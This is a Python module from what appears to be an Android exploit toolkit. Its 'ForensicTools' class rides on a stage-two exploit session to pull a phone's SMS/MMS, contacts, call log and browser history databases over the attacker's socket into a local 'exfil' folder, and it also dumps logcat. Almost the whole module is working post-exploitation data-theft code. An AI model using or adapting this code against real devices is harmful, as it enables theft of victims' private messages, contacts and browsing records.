import os
from .utils import console
from .stage2 import Stage2Exploit

class ForensicTools:
    DATABASE_MAP = {'SMS/MMS': '/data/user_de/0/com.android.providers.telephony/databases/mmssms.db', 'Contacts': '/data/data/com.android.providers.contacts/databases/contacts2.db', 'Call Logs': '/data/data/com.android.providers.contacts/databases/calllog.db', 'Chrome History': '/data/data/com.android.chrome/app_chrome/Default/History', 'Browser History': '/data/data/com.android.browser/databases/browser2.db'}

    def __init__(self, stage2: Stage2Exploit):
        self.s2 = stage2

    def pull_forensic_database(self, db_name: str, out_dir: str='exfil'):
        if db_name not in self.DATABASE_MAP:
            return False
        remote_path = self.DATABASE_MAP[db_name]
        if not os.path.exists(out_dir):
            os.makedirs(out_dir)
        local_path = os.path.join(out_dir, f"{db_name.lower().replace(' ', '_')}.db")
        console.print(f'[info]Extracting {db_name}...')
        res = self.s2.session.run_command(f'ls {remote_path}')
        if 'No such file' in res:
            console.print(f'[warning]{db_name} database not found at expected path.[/]')
            return False
        self.s2.session.send_command(f'cat {remote_path}')
        try:
            with open(local_path, 'wb') as f:
                while True:
                    chunk = self.s2.session.socket.recv(8192)
                    if not chunk:
                        break
                    f.write(chunk)
            console.print(f'[success]Extracted to {local_path}[/]')
            return True
        except Exception as e:
            console.print(f'[error]Exfiltration failed: {e}[/]')
            return False

    def get_logcat_dump(self, filter_str: str='Zygote'):
        console.print(f"[info]Dumping Logcat filtered by '{filter_str}'...")
        return self.s2.session.run_command(f'logcat -d -v time *:S {filter_str}:V')